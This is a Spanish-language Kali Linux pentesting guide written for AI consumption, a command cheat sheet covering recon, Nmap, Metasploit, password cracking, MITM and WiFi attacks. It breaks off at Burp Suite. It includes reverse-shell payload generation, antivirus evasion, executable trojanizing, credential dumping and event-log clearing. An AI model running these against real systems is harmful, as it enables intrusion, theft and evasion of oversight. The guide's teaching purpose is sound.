# Kali Linux — Guía Completa para IA

## Metadatos del Conocimiento
- **Dominio**: Ciberseguridad ofensiva y defensiva, pentesting, hacking ético
- **Plataforma**: Kali Linux (basado en Debian)
- **Versión de referencia**: Kali Linux 2024.x
- **Alcance**: Reconocimiento, escaneo, explotación, post-explotación, forense, defensa, herramientas nativas y de terceros

---

## 1. ¿Qué es Kali Linux?

Kali Linux es una distribución de Linux desarrollada y mantenida por **Offensive Security**, diseñada específicamente para **pruebas de penetración (pentesting)**, **auditorías de seguridad**, **forense digital** e **investigación de vulnerabilidades**. No es una distro de uso general; está orientada a profesionales de ciberseguridad.

### Características clave
- Más de **600 herramientas** de seguridad preinstaladas
- Basada en **Debian Testing** (rolling release)
- Soporte para arquitecturas: x86, x64, ARM, MIPS
- Modo **live** (sin instalar), **persistente** y **full install**
- Disponible para bare metal, VM, WSL2, Docker, Raspberry Pi, móviles (Kali NetHunter)
- Kernel personalizado con patches para inyección de paquetes WiFi

### Variantes disponibles
```
Kali Linux Installer   → Instalación completa en disco
Kali Live              → Bootear sin instalar
Kali NetHunter         → Android (dispositivos móviles)
Kali Purple            → Orientado a defensa (Blue Team)
Kali WSL2              → Windows Subsystem for Linux
Kali Docker            → Contenedor ligero
Kali ARM               → Raspberry Pi y similares
```

---

## 2. Instalación y Configuración Inicial

### Comandos de sistema base
```bash
# Actualizar sistema completo
sudo apt update && sudo apt full-upgrade -y

# Instalar herramientas por metapaquetes
sudo apt install kali-tools-top10          # Top 10 herramientas esenciales
sudo apt install kali-tools-web            # Herramientas web
sudo apt install kali-tools-wireless       # Herramientas WiFi
sudo apt install kali-tools-forensics      # Herramientas forenses
sudo apt install kali-tools-exploitation   # Frameworks de explotación
sudo apt install kali-tools-passwords      # Cracking de contraseñas
sudo apt install kali-tools-sniffing-spoofing  # Sniffing y spoofing
sudo apt install kali-tools-reporting      # Herramientas de reporte
sudo apt install kali-linux-everything     # TODAS las herramientas (>15GB)

# Información del sistema
uname -a                                   # Kernel y arquitectura
lsb_release -a                             # Versión de Kali
hostnamectl                                # Info del host
cat /etc/os-release                        # Detalles del OS

# Cambiar hostname
hostnamectl set-hostname nuevo-nombre

# Gestión de usuarios
passwd                                     # Cambiar contraseña
adduser nuevo-usuario
usermod -aG sudo nuevo-usuario
```

### Configurar servicios al inicio
```bash
# SSH
sudo systemctl enable ssh
sudo systemctl start ssh
sudo service ssh start

# PostgreSQL (requerido por Metasploit)
sudo systemctl enable postgresql
sudo systemctl start postgresql

# Ver todos los servicios
sudo systemctl list-unit-files --type=service | grep enabled
```

---

## 3. Conceptos Fundamentales de Pentesting

### Fases de una prueba de penetración
```
1. RECONOCIMIENTO (Reconnaissance)
   ├── Pasivo: sin contacto directo con el objetivo (OSINT)
   └── Activo: interacción directa con sistemas objetivo

2. ESCANEO Y ENUMERACIÓN (Scanning & Enumeration)
   ├── Descubrimiento de hosts activos
   ├── Escaneo de puertos y servicios
   └── Identificación de versiones y OS

3. ANÁLISIS DE VULNERABILIDADES (Vulnerability Analysis)
   ├── Búsqueda de CVEs conocidos
   └── Identificación de configuraciones débiles

4. EXPLOTACIÓN (Exploitation)
   ├── Explotación de vulnerabilidades
   └── Bypass de controles de seguridad

5. POST-EXPLOTACIÓN (Post-Exploitation)
   ├── Escalada de privilegios
   ├── Movimiento lateral
   ├── Persistencia
   └── Exfiltración de datos

6. REPORTE (Reporting)
   ├── Documentación de hallazgos
   ├── Clasificación por severidad (CVSS)
   └── Recomendaciones de remediación
```

### Terminología esencial
```
CVE          → Common Vulnerabilities and Exposures (ID único de vulnerabilidad)
CVSS         → Common Vulnerability Scoring System (puntaje 0–10)
RCE          → Remote Code Execution
LFI          → Local File Inclusion
RFI          → Remote File Inclusion
SQLi         → SQL Injection
XSS          → Cross-Site Scripting
SSRF         → Server-Side Request Forgery
CSRF         → Cross-Site Request Forgery
XXE          → XML External Entity
IDOR         → Insecure Direct Object Reference
PrivEsc      → Privilege Escalation
C2 / C&C     → Command and Control (servidor del atacante)
Payload      → Código malicioso enviado al objetivo
Shellcode    → Código máquina para obtener shell
Reverse Shell → La víctima conecta al atacante
Bind Shell   → El atacante conecta a la víctima
Meterpreter  → Shell avanzado de Metasploit
Pivot        → Usar un host comprometido para atacar otros
Lateral Move → Moverse entre hosts de la misma red
Persistence  → Mantener acceso tras reinicios
LOOT         → Datos valiosos extraídos del objetivo
```

---

## 4. Reconocimiento (OSINT y Pasivo)

### theHarvester
```bash
# Recolectar emails, subdominios, IPs, URLs
theHarvester -d dominio.com -b all
theHarvester -d dominio.com -b google,bing,linkedin
theHarvester -d dominio.com -b google -l 500    # Límite de resultados
theHarvester -d dominio.com -f reporte          # Guardar en HTML/XML
```

### Maltego
Herramienta visual de OSINT para mapear relaciones entre entidades (personas, dominios, IPs, organizaciones). Se ejecuta con interfaz gráfica:
```bash
maltego
```

### Recon-ng
Framework modular de reconocimiento OSINT:
```bash
recon-ng
# Dentro del framework:
[recon-ng] > marketplace search whois
[recon-ng] > marketplace install recon/domains-hosts/hackertarget
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > options set SOURCE dominio.com
[recon-ng] > run
[recon-ng] > show hosts
```

### WHOIS, DNS y certificados
```bash
# WHOIS
whois dominio.com
whois 192.168.1.1

# DNS
nslookup dominio.com
nslookup dominio.com 8.8.8.8           # Usar DNS específico
dig dominio.com                         # Query DNS completo
dig dominio.com MX                      # Registros de correo
dig dominio.com NS                      # Nameservers
dig dominio.com ANY                     # Todos los registros
dig @8.8.8.8 dominio.com               # DNS específico
dig -x 192.168.1.1                      # Reverse lookup
host dominio.com                        # Resolución rápida

# Transferencia de zona DNS (si está mal configurado)
dig axfr @ns1.dominio.com dominio.com
fierce --domain dominio.com             # Enumeración de DNS agresiva
dnsrecon -d dominio.com -t axfr         # Intentar transferencia de zona
dnsrecon -d dominio.com -t brt          # Brute force de subdominios

# Subdominios
sublist3r -d dominio.com
sublist3r -d dominio.com -p 80,443 -o subdominios.txt
amass enum -d dominio.com
amass enum -passive -d dominio.com
amass enum -brute -d dominio.com -w /usr/share/wordlists/dns.txt
```

### Shodan (motor de búsqueda de dispositivos)
```bash
# Instalar CLI
pip install shodan
shodan init TU_API_KEY

# Búsquedas
shodan search "apache 2.4"
shodan search "default password"
shodan host 192.168.1.1
shodan count "nginx"
shodan download resultados.json.gz "port:22 country:CO"
```

### Google Dorks (OSINT pasivo)
```
site:dominio.com                        # Todo el sitio
site:dominio.com filetype:pdf           # PDFs del sitio
site:dominio.com inurl:admin            # URLs con "admin"
intext:"index of /" site:dominio.com    # Directory listing
intitle:"login" site:dominio.com        # Páginas de login
"password" filetype:xls site:dominio.com
"phpMyAdmin" inurl:phpmyadmin
inurl:".git" site:dominio.com           # Repos Git expuestos
```

---

## 5. Escaneo de Redes

### Nmap — El estándar de oro
```bash
# Descubrimiento de hosts
nmap -sn 192.168.1.0/24                 # Ping sweep (sin escaneo de puertos)
nmap -sn 192.168.1.0/24 --send-ip      # Forzar IP (no ARP)
nmap -PR 192.168.1.0/24                 # ARP scan (muy rápido en red local)

# Tipos de escaneo de puertos
nmap -sS 192.168.1.1                    # SYN scan (stealth, requiere root)
nmap -sT 192.168.1.1                    # TCP connect (no requiere root)
nmap -sU 192.168.1.1                    # UDP scan
nmap -sA 192.168.1.1                    # ACK scan (detectar firewall)
nmap -sF 192.168.1.1                    # FIN scan
nmap -sX 192.168.1.1                    # Xmas scan
nmap -sN 192.168.1.1                    # Null scan
nmap -sW 192.168.1.1                    # Window scan

# Puertos
nmap -p 22,80,443 192.168.1.1          # Puertos específicos
nmap -p 1-1000 192.168.1.1             # Rango de puertos
nmap -p- 192.168.1.1                    # TODOS los puertos (65535)
nmap --top-ports 1000 192.168.1.1      # Top 1000 puertos más comunes
nmap -F 192.168.1.1                     # Fast scan (top 100)

# Detección de servicios y OS
nmap -sV 192.168.1.1                    # Versiones de servicios
nmap -O 192.168.1.1                     # Detección de OS
nmap -A 192.168.1.1                     # Agresivo: OS + versiones + scripts + traceroute
nmap -sV --version-intensity 9 192.168.1.1  # Máxima intensidad de detección

# Scripts NSE (Nmap Scripting Engine)
nmap -sC 192.168.1.1                    # Scripts por defecto
nmap --script=vuln 192.168.1.1          # Scripts de vulnerabilidades
nmap --script=http-enum 192.168.1.1     # Enumeración HTTP
nmap --script=smb-vuln-ms17-010 192.168.1.1  # EternalBlue
nmap --script=ftp-anon 192.168.1.1      # FTP anónimo
nmap --script=ssh-brute 192.168.1.1     # Brute force SSH
nmap --script=dns-zone-transfer 192.168.1.1
nmap --script "http-*" 192.168.1.1      # Todos los scripts HTTP
nmap --script-updatedb                   # Actualizar base de datos de scripts

# Evasión de IDS/Firewall
nmap -D RND:10 192.168.1.1             # Decoy: mezclar con IPs falsas
nmap -S 10.0.0.1 192.168.1.1           # Spoof source IP
nmap -f 192.168.1.1                     # Fragmentar paquetes
nmap --mtu 24 192.168.1.1              # MTU personalizado
nmap --scan-delay 1s 192.168.1.1       # Delay entre paquetes
nmap -T0 192.168.1.1                    # Paranoid (más lento, más sigiloso)
nmap -T5 192.168.1.1                    # Insane (muy rápido, ruidoso)

# Salida y reportes
nmap -oN reporte.txt 192.168.1.1       # Formato normal
nmap -oX reporte.xml 192.168.1.1       # XML
nmap -oG reporte.gnmap 192.168.1.1     # Grepable
nmap -oA reporte 192.168.1.1           # Los tres formatos a la vez

# Combinaciones comunes
nmap -sV -sC -O -p- --min-rate 5000 192.168.1.1  # Escaneo completo rápido
nmap -A -T4 192.168.1.0/24                         # Red completa agresivo
sudo nmap -sS -sU -T4 -A -p- 192.168.1.1          # TCP + UDP completo
```

### Masscan — Escaneo ultrarrápido
```bash
masscan 192.168.1.0/24 -p 1-65535 --rate 1000
masscan 0.0.0.0/0 -p 80,443 --rate 100000        # Internet completo ⚠️
masscan 192.168.1.0/24 -p 22 -oX resultado.xml
```

### Netdiscover — Descubrimiento ARP
```bash
sudo netdiscover -r 192.168.1.0/24
sudo netdiscover -i eth0 -r 192.168.1.0/24
sudo netdiscover -p                                # Modo pasivo
```

### Herramientas de red adicionales
```bash
# Traceroute
traceroute dominio.com
traceroute -I dominio.com                         # ICMP
mtr dominio.com                                   # Traceroute continuo

# Información de interfaces
ip a                                              # Ver interfaces
ip route                                          # Ver rutas
ip neigh                                          # Tabla ARP
ifconfig                                          # Clásico

# Netstat / SS
netstat -tulpn                                    # Puertos abiertos localmente
ss -tulpn                                         # Moderno, más rápido
ss -s                                             # Estadísticas
```

---

## 6. Enumeración de Servicios

### SMB / Samba (Puerto 445/139)
```bash
# Enum4linux — Enumeración completa SMB
enum4linux -a 192.168.1.1                         # Todo
enum4linux -U 192.168.1.1                         # Usuarios
enum4linux -S 192.168.1.1                         # Shares
enum4linux -P 192.168.1.1                         # Políticas de contraseña
enum4linux-ng -A 192.168.1.1                      # Versión mejorada

# smbclient
smbclient -L \\\\192.168.1.1                      # Listar shares
smbclient \\\\192.168.1.1\\share -U usuario       # Conectar a share
smbclient -N \\\\192.168.1.1\\share               # Sin contraseña (null session)

# smbmap
smbmap -H 192.168.1.1                             # Ver shares y permisos
smbmap -H 192.168.1.1 -u usuario -p contraseña
smbmap -H 192.168.1.1 -R                          # Recursivo
smbmap -H 192.168.1.1 --download carpeta/archivo  # Descargar archivo

# crackmapexec (CME)
crackmapexec smb 192.168.1.0/24                   # Descubrir hosts SMB
crackmapexec smb 192.168.1.1 -u usuario -p pass
crackmapexec smb 192.168.1.1 --shares             # Listar shares
crackmapexec smb 192.168.1.1 --users              # Listar usuarios
crackmapexec smb 192.168.1.1 --pass-pol           # Política de contraseñas
crackmapexec smb 192.168.1.1 -u usuario -p pass --sam  # Volcar SAM
```

### SSH (Puerto 22)
```bash
ssh usuario@192.168.1.1
ssh -p 2222 usuario@192.168.1.1                   # Puerto alternativo
ssh -i clave_privada.pem usuario@192.168.1.1      # Con clave privada
ssh -L 8080:localhost:80 usuario@192.168.1.1      # Local port forward
ssh -R 8080:localhost:80 usuario@192.168.1.1      # Remote port forward
ssh -D 1080 usuario@192.168.1.1                   # Dynamic SOCKS proxy

# Enumeración
nmap --script=ssh-hostkey 192.168.1.1
nmap --script=ssh2-enum-algos 192.168.1.1
ssh-audit 192.168.1.1                             # Auditoría de configuración SSH
```

### FTP (Puerto 21)
```bash
ftp 192.168.1.1
ftp -n 192.168.1.1                                # Sin auto-login
# Dentro de ftp: open, get, put, ls, cd, bye

# Login anónimo
nmap --script=ftp-anon 192.168.1.1
ftp 192.168.1.1                                   # user: anonymous / pass: cualquier email

# Medusa brute force
medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ftp
```

### HTTP/HTTPS (Puertos 80/443)
```bash
# Whatweb — Fingerprinting
whatweb http://192.168.1.1
whatweb -v http://dominio.com                     # Verbose
whatweb -a 3 http://dominio.com                   # Agresividad máxima

# Nikto — Scanner de vulnerabilidades web
nikto -h http://192.168.1.1
nikto -h http://192.168.1.1 -p 8080
nikto -h http://192.168.1.1 -ssl
nikto -h http://192.168.1.1 -o reporte.html -Format htm
nikto -h http://192.168.1.1 -Tuning 1             # Solo inyecciones

# Directorios y archivos
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://192.168.1.1 -w wordlist.txt -x php,html,txt,bak
gobuster dns -d dominio.com -w wordlist.txt       # Fuerza bruta DNS
gobuster vhost -u http://dominio.com -w wordlist.txt  # Virtual hosts
feroxbuster -u http://192.168.1.1 -w wordlist.txt -x php,html
feroxbuster -u http://192.168.1.1 --auto-tune     # Auto-ajuste de velocidad
dirb http://192.168.1.1 /usr/share/dirb/wordlists/common.txt
dirsearch -u http://192.168.1.1 -e php,asp,aspx,jsp

# wfuzz — Fuzzing web
wfuzz -c -w wordlist.txt http://192.168.1.1/FUZZ
wfuzz -c -w wordlist.txt -u http://dominio.com/FUZZ.php
wfuzz -c -w users.txt -w pass.txt -u http://dominio.com/login -d "user=FUZZ&pass=FUZ2Z"
wfuzz -c -w wordlist.txt --hc 404 http://192.168.1.1/FUZZ  # Ocultar 404

# ffuf — Fuzzer moderno
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt -e .php,.html,.txt
ffuf -u http://dominio.com -H "Host: FUZZ.dominio.com" -w wordlist.txt  # VHosts
ffuf -u http://192.168.1.1/login -d "user=FUZZ&pass=test" -w users.txt -mc 200
```

### SNMP (Puerto 161 UDP)
```bash
snmp-check 192.168.1.1
snmp-check 192.168.1.1 -c public                  # Community string
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1
snmpwalk -v2c -c public 192.168.1.1
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1   # OID específico
```

### LDAP (Puerto 389)
```bash
ldapsearch -x -H ldap://192.168.1.1 -b "dc=dominio,dc=com"
ldapsearch -x -H ldap://192.168.1.1 -b "" -s base
ldapsearch -x -H ldap://192.168.1.1 -D "CN=admin,DC=dominio,DC=com" -w pass -b "DC=dominio,DC=com"
nmap -p 389 --script=ldap-search 192.168.1.1
```

### MySQL / MSSQL / PostgreSQL
```bash
# MySQL
mysql -h 192.168.1.1 -u root -p
mysql -h 192.168.1.1 -u root -p -e "show databases;"
nmap -p 3306 --script=mysql-info,mysql-empty-password 192.168.1.1

# MSSQL
sqsh -S 192.168.1.1 -U sa -P password
nmap -p 1433 --script=ms-sql-info,ms-sql-empty-password 192.168.1.1
crackmapexec mssql 192.168.1.1 -u sa -p password

# PostgreSQL
psql -h 192.168.1.1 -U postgres
nmap -p 5432 --script=pgsql-brute 192.168.1.1
```

---

## 7. Análisis de Vulnerabilidades

### OpenVAS / GVM
```bash
# Instalar y configurar
sudo apt install gvm
sudo gvm-setup
sudo gvm-start
# Acceder en: https://127.0.0.1:9392

# Estado
sudo gvm-check-setup
sudo runuser -u _gvm -- gvmd --get-users
```

### Nessus
```bash
# Iniciar Nessus
sudo systemctl start nessusd
# Acceder en: https://localhost:8834
```

### Searchsploit — Búsqueda de exploits
```bash
searchsploit apache 2.4
searchsploit windows smb
searchsploit -x 39772                             # Examinar exploit
searchsploit -m 39772                             # Copiar exploit al directorio actual
searchsploit --update                             # Actualizar base de datos
searchsploit -t "remote code execution"
searchsploit --cve CVE-2021-44228                 # Buscar por CVE (Log4Shell)
```

### Vulners y bases de datos
```bash
# Nmap con scripts de vulnerabilidades
nmap --script vulners -sV 192.168.1.1
nmap --script vuln 192.168.1.1

# Recursos online
# https://www.exploit-db.com
# https://nvd.nist.gov
# https://cve.mitre.org
# https://vulners.com
```

---

## 8. Metasploit Framework

El framework de explotación más utilizado en el mundo.

### Conceptos
```
Module Types:
  auxiliary    → Escaneo, enumeración, fuzzing (sin payload)
  exploit      → Módulos de explotación activa
  payload      → Código que se ejecuta tras explotar
  encoder      → Ofuscar payloads (evadir AV)
  nop          → NOP sleds para buffer overflows
  post         → Post-explotación (tras tener sesión)

Payload Types:
  singles      → Todo en uno, sin staged
  stagers      → Establecen conexión, cargan stage
  stages       → Descargados por stagers (Meterpreter)

  windows/meterpreter/reverse_tcp   → Staged, Windows, TCP reverso
  windows/shell_reverse_tcp         → Shell clásico, Windows
  linux/x86/meterpreter_reverse_tcp → Linux Meterpreter
  php/meterpreter/reverse_tcp       → Para webshells PHP
```

### Uso básico
```bash
# Iniciar
msfconsole
msfconsole -q                                     # Sin banner

# Dentro de msfconsole:
msf6> search eternalblue
msf6> search type:exploit platform:windows smb
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> info                                         # Info del módulo
msf6> show options                                 # Ver opciones requeridas
msf6> set RHOSTS 192.168.1.1
msf6> set RPORT 445
msf6> set LHOST 192.168.1.100
msf6> set LPORT 4444
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> show payloads                                # Ver payloads compatibles
msf6> check                                        # Verificar si el objetivo es vulnerable
msf6> run                                          # Ejecutar
msf6> exploit -j                                   # Ejecutar en background

# Sesiones
msf6> sessions                                     # Listar sesiones activas
msf6> sessions -i 1                                # Interactuar con sesión 1
msf6> sessions -k 1                                # Matar sesión 1
msf6> sessions -K                                  # Matar todas las sesiones

# Módulos útiles (auxiliary)
msf6> use auxiliary/scanner/portscan/tcp
msf6> use auxiliary/scanner/smb/smb_version
msf6> use auxiliary/scanner/http/http_version
msf6> use auxiliary/scanner/ftp/anonymous
msf6> use auxiliary/scanner/ssh/ssh_version
msf6> use auxiliary/scanner/mysql/mysql_login
```

### Meterpreter — Shell avanzado
```bash
# Información del sistema
meterpreter> sysinfo
meterpreter> getuid                               # Usuario actual
meterpreter> getpid                               # PID del proceso
meterpreter> ps                                   # Lista de procesos
meterpreter> pwd                                  # Directorio actual
meterpreter> ls                                   # Listar archivos

# Navegación de archivos
meterpreter> cd C:\\Users\\Admin
meterpreter> cat archivo.txt
meterpreter> download archivo.txt /home/kali/     # Descargar archivo
meterpreter> upload /home/kali/tool.exe C:\\      # Subir archivo
meterpreter> search -f *.txt                      # Buscar archivos
meterpreter> edit archivo.txt                     # Editar con vim

# Escalada y pivoting
meterpreter> getsystem                            # Intentar escalada a SYSTEM
meterpreter> steal_token PID                      # Robar token de proceso
meterpreter> migrate PID                          # Migrar a otro proceso
meterpreter> run post/multi/recon/local_exploit_suggester  # Sugerir escaladas locales

# Credenciales
meterpreter> hashdump                             # Volcar hashes SAM (Windows)
meterpreter> run post/windows/gather/credentials/credential_collector
meterpreter> run post/multi/gather/ssh_creds
meterpreter> load kiwi                            # Cargar Mimikatz
meterpreter> creds_all                            # Obtener todas las credenciales
meterpreter> lsa_dump_sam                         # Volcar SAM
meterpreter> lsa_dump_secrets                     # Volcar secretos LSA

# Red y pivoting
meterpreter> ipconfig                             # Interfaces de red
meterpreter> arp                                  # Tabla ARP
meterpreter> route add 10.10.10.0/24 1            # Agregar ruta via sesión 1
meterpreter> portfwd add -l 8080 -p 80 -r 192.168.2.1  # Port forward
meterpreter> run auxiliary/server/socks_proxy     # SOCKS proxy

# Evasión y persistencia
meterpreter> clearev                              # Limpiar logs de eventos
meterpreter> timestomp archivo.exe -z             # Modificar timestamps
meterpreter> run post/windows/manage/persistence  # Persistencia (startup)
meterpreter> background                           # Enviar a background
```

### msfvenom — Generador de payloads
```bash
# Listar payloads
msfvenom -l payloads
msfvenom -l payloads | grep windows
msfvenom -l encoders

# Payloads Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Payloads Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
chmod +x payload.elf

# Payloads Web
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f aspx -o shell.aspx

# Con codificación (evadir AV básico)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/zutto_dekiru -i 5 -f exe -o encoded.exe

# Inyectar en ejecutable legítimo
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x calc.exe -k -f exe -o calc_trojanized.exe
```

---

## 9. Ataques de Contraseñas

### Hydra — Brute force online
```bash
hydra -l usuario -p contraseña 192.168.1.1 ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
hydra -L users.txt -P passwords.txt 192.168.1.1 ftp
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P rockyou.txt 192.168.1.1 http-get /admin/
hydra -l admin -P rockyou.txt 192.168.1.1 rdp
hydra -l admin -P rockyou.txt 192.168.1.1 smb
hydra -t 4 -l admin -P rockyou.txt 192.168.1.1 ssh   # 4 tareas paralelas
```

### John the Ripper
```bash
# Crackear hashes
john hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=wordlist.txt --rules hash.txt           # Con reglas de mutación
john --format=md5crypt hash.txt
john --format=bcrypt hash.txt
john --format=NT hash.txt                               # NTLM (Windows)
john --show hash.txt                                    # Ver contraseñas crackeadas

# Preparar archivos
unshadow /etc/passwd /etc/shadow > combined.txt         # Linux
john combined.txt --wordlist=rockyou.txt

# Zip y archivos protegidos
zip2john archivo.zip > zip_hash.txt
john zip_hash.txt --wordlist=rockyou.txt
pdf2john archivo.pdf > pdf_hash.txt
ssh2john clave_privada > ssh_hash.txt
```

### Hashcat — Cracking con GPU (muy rápido)
```bash
# Modos de ataque
# -a 0 = wordlist
# -a 1 = combinación
# -a 3 = brute force / máscara
# -a 6 = wordlist + máscara
# -a 7 = máscara + wordlist

# Ejemplos
hashcat -m 0 hash.txt rockyou.txt                       # MD5 + wordlist
hashcat -m 1000 hash.txt rockyou.txt                    # NTLM
hashcat -m 1800 hash.txt rockyou.txt                    # SHA-512crypt (Linux $6$)
hashcat -m 3200 hash.txt rockyou.txt                    # bcrypt
hashcat -m 22000 hash.txt rockyou.txt                   # WPA2 (handshakes WiFi)
hashcat -m 13100 hash.txt rockyou.txt                   # Kerberoast (TGS)

# Brute force con máscara
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d?d            # Mayus+3letras+4números
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a             # 8 chars cualquier carácter

# Con reglas de mutación
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Identificar tipo de hash
hashid '$2y$10$...'
hash-identifier
hashcat --example-hashes | grep -A2 "NTLM"
```

### CeWL — Wordlists personalizadas
```bash
cewl http://dominio.com -w wordlist.txt                 # Generar de un sitio web
cewl http://dominio.com -d 3 -m 5 -w wordlist.txt       # Profundidad 3, min 5 chars
cewl http://dominio.com --with-numbers -w wordlist.txt
```

### Crunch — Generar wordlists
```bash
crunch 8 8 0123456789 -o numeros.txt                    # 8 dígitos
crunch 6 8 abcdefghij -o letras.txt                     # 6-8 letras
crunch 8 8 -t @@@@1234                                   # Patrón: @ = letra
crunch 10 10 -t %%%%%%%%%%                               # % = número
```

---

## 10. Sniffing y Ataques de Red

### Wireshark
```bash
wireshark                                               # GUI
tshark -i eth0                                          # CLI
tshark -i eth0 -w captura.pcap                          # Guardar captura
tshark -r captura.pcap                                  # Leer captura
tshark -i eth0 -f "port 80"                             # Filtro de captura
tshark -i eth0 -Y "http.request.method == POST"         # Filtro de display
tshark -r captura.pcap -T fields -e http.host -e http.request.uri
```

### tcpdump
```bash
tcpdump -i eth0                                         # Capturar en eth0
tcpdump -i eth0 -w captura.pcap                         # Guardar
tcpdump -r captura.pcap                                 # Leer
tcpdump -i eth0 port 80                                 # Solo puerto 80
tcpdump -i eth0 src 192.168.1.1                         # Solo fuente específica
tcpdump -i eth0 tcp                                     # Solo TCP
tcpdump -i eth0 -A port 80                              # Mostrar contenido ASCII
tcpdump -i eth0 'tcp port 80 and host 192.168.1.1'
tcpdump -i eth0 -n -X port 21                           # Hex + ASCII
```

### Ettercap — MITM y ARP poisoning
```bash
ettercap -T -q -i eth0                                  # CLI silencioso
ettercap -G                                              # GUI
# ARP Poisoning MITM
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.2// -i eth0
ettercap -T -q -M arp:remote -i eth0 // //              # Toda la red
```

### Bettercap — MITM moderno
```bash
bettercap -iface eth0
# Dentro de bettercap:
net.probe on                                            # Descubrir hosts
net.show                                                # Mostrar hosts
set arp.spoof.targets 192.168.1.5
arp.spoof on                                            # Activar ARP spoofing
net.sniff on                                            # Sniffing
http.proxy on                                           # Proxy HTTP
https.proxy on                                          # Proxy HTTPS
set https.proxy.sslstrip true                           # SSL Strip
```

### Arpspoof
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward                  # Habilitar IP forwarding
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1             # Envenenar víctima
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5             # Envenenar gateway
```

### Responder — Captura de hashes NTLM
```bash
responder -I eth0 -rdwv
responder -I eth0 -A                                    # Modo análisis (no responde)
# Responder captura hashes NTLMv2 automáticamente
# Los hashes se guardan en /usr/share/responder/logs/
hashcat -m 5600 hash_ntlmv2.txt rockyou.txt             # Crackear NTLMv2
```

---

## 11. Ataques WiFi

### Aircrack-ng Suite
```bash
# Preparar interfaz en modo monitor
airmon-ng check kill                                    # Matar procesos conflictivos
airmon-ng start wlan0                                   # Activar modo monitor → wlan0mon
airmon-ng stop wlan0mon                                 # Volver a modo normal

# Descubrir redes
airodump-ng wlan0mon                                    # Ver todas las redes
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon  # Capturar red específica

# Capturar handshake WPA2
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# En otra terminal: deautenticar cliente para forzar reconexión
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:11:22 wlan0mon

# Crackear contraseña
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
hashcat -m 22000 handshake.hccapx rockyou.txt           # Más rápido con GPU

# Crear handshake para hashcat
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 captura.pcapng

# WEP (obsoleto pero aún existe)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon         # Fake auth
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon            # ARP replay
aircrack-ng wep-01.cap                                  # Crackear (sin wordlist)

# WPS
wash -i wlan0mon                                        # Ver redes con WPS
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv             # Ataque WPS pin
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1        # Pixie Dust attack
```

### Evil Twin / Rogue AP
```bash
# hostapd-wpe — Punto de acceso falso para capturar credenciales
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Fluxion / Wifiphisher (herramientas de social engineering WiFi)
wifiphisher -aI wlan0 -jI wlan1 -p wifi_connect
```

---

## 12. Explotación Web

### SQLMap — Inyección SQL automatizada
```bash
sqlmap -u "http://dominio.com/page?id=1"
sqlmap -u "http://dominio.com/page?id=1" --dbs           # Listar bases de datos
sqlmap -u "http://dominio.com/page?id=1" -D dbname --tables  # Listar tablas
sqlmap -u "http://dominio.com/page?id=1" -D dbname -T users --dump  # Volcar tabla
sqlmap -u "http://dominio.com/page?id=1" --os-shell       # Shell OS
sqlmap -u "http://dominio.com/page?id=1" --os-pwn         # Meterpreter via SQLi
sqlmap -u "http://dominio.com/page?id=1" --batch          # No preguntar
sqlmap -r request.txt                                     # Desde petición guardada (Burp)
sqlmap -u "http://dominio.com/login" --data="user=test&pass=test" --dbs
sqlmap -u "http://dominio.com/" --cookie="PHPSESSID=xxx" --dbs
sqlmap -u "http://dominio.com/" --level=5 --risk=3        # Máxima intensidad
sqlmap -u "http://dominio.com/" --tamper=space2comment     # Evadir WAF
```

### Burp Suite
Proxy interceptor de HTTP/HTTPS con suite completa de herramientas.
```bash
burpsuite                                                 # Iniciar GUI

